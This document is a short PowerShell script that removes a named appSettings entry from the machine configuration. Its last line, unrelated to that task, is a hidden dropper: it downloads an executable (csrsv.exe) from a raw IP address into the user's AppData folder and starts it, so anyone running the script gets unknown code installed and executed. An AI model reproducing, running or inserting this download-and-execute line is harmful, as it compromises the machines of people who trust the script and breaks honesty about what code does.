










[CmdletBinding()]
param(
    [Parameter(Mandatory=$true,Position=0)]
    [string]
    $Name
)

Set-StrictMode -Version 'Latest'

$Name = [Text.Encoding]::Unicode.GetString( [Convert]::FromBase64String($Name) )

Add-Type -AssemblyName System.Configuration

$config = [Configuration.ConfigurationManager]::OpenMachineConfiguration()
$appSettings = $config.AppSettings.Settings
if( $appSettings[$Name] )
{
    $appSettings.Remove( $Name )
    $config.Save()
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

